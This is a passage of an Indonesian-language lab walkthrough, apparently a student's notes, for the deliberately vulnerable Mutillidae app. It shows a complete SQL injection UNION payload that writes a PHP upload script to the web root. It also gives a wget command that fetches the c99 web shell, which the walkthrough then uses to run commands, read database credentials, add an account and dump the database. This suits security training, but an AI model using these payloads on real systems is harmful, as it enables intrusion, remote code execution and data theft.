# SQL Injection Union Exploit #4 (Create PHP Upload Script)

## Persiapkan file yang ingin di inject
1. Download rar file
```
wget http://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson11/stuff.rar
```
![1](/lesson11/1.png)

2. Extract rar file
```
unrar x stuff.rar
```
```
cat part1.txt part2.txt part3.txt > c99.php
```
buat backup untuk file c99.php
```
cp c99.php c99.php.bkp
```
![1](/lesson11/2.png)

4. persiapkan file c99.php
 1. lihat apakah barus pertama tidak mengandung ```<?php```
 ```
 head -1 c99.php
 ```
 2. replace baris pertama dengan ```<?php```
 ```
 sed -i '1 s/^.*$/<?php/g' c99.php
 ```
 3. lihat lagi apakah baris pertamanya sudah berubah atau belum
 ```
 head -1 c99.php
 ```
![1](/lesson11/3.png)

## Lakukan upload file pada mutillidae
1. Masuk ke halaman sqli user info dengan cara klik menu pada sidebar kiri ```Owasp Top 10 -> A1 - Injection -> SQLi - Extract Data -> User Info```
![1](/lesson11/4.png)

2. Inspect element pada button submit dan ubah attribut menjadi ```text-align="left"```
![1](/lesson11/5.png)

3. Inspect element pada form ```Name``` dan ubah attribut sizenya menjadi ```size="550"```
![1](/lesson11/6.png)

4. Masukkan query sqli di kolom ```Name```
```
' union select null,null,null,null,'<html><body><div><?php if(isset($_FILES["fupload"])) { $source = $_FILES["fupload"]["tmp_name"]; $target = $_FILES["fupload"]["name"]; move_uploaded_file($source,$target); system("chmod 770 $target"); $size = getImageSize($target); } ?></div><form enctype="multipart/form-data" action="<?php print $_SERVER["PHP_SELF"]?>" method="post"><p><input type="hidden" name="MAX_FILE_SIZE" value="500000"><input type="file" name="fupload"><br><input type="submit" name="upload!"><br></form></body></html>' INTO DUMPFILE '/var/www/mutillidae/upload_file.php' --
```
jangan lupa unutk menambahkan spasi setelah syntax comment ```"-- "```
![1](/lesson11/7.png)

5. akan muncul pesan error seperti ini
![1](/lesson11/8.png)

6. lalu buka ```http://10.151.36.156/upload_file.php```
kita akan melihat halaman upload seperti ini. lalu klik browse dan upload file ```c99.php``` yang telah di download tadi. lalu upload dengan klik tombol submit query
![1](/lesson11/9.png)

7. buka halaman ```http://10.151.36.156/mutillidae/c99.php``` maka kita akan melihat halaman ini.
![1](/lesson11/10.png)

8. scroll kebawah dan kita akan melihat section ```command section``` coba ketikkan ```pwd``` pada kolom yang berada di kiri lalu tekan ```execute```
![1](/lesson11/11.png)

9. Kita bisa lihat hasil execute command tadi akan menghasilkan halaman dan output seperti itu (lokasi file c99.php berada)
![1](/lesson11/12.png)

10. ketikkan pada kolom yang bawah command untuk mencari file include yang menagandung password
![1](/lesson11/14.png)

11. disitu kita mendapatkan configurasi db untuk mutillidae. setelah itu masuk masuk ke tab (menu) SQL
![1](/lesson11/15.png)

12. masukkan detail database seperti yang tadi didapatkan dari file config.inc
![1](/lesson11/16.png)

13. pilih tabel accounts
![1](/lesson11/17.png)

14. pilih insert lalu masukkan data baru seperti dibawah
 * ![1](/lesson11/19.png)
 * ![1](/lesson11/20.png)

15. pilih menu dump
![1](/lesson11/21.png)

16. Masukkan data seperti di bawah. lalu klik tombol ```dump```
![1](/lesson11/22.png)

17. pop up download akan muncul dan klik tombol ```save file```
 * ![1](/lesson11/23.png)
 * ![1](/lesson11/24.png)
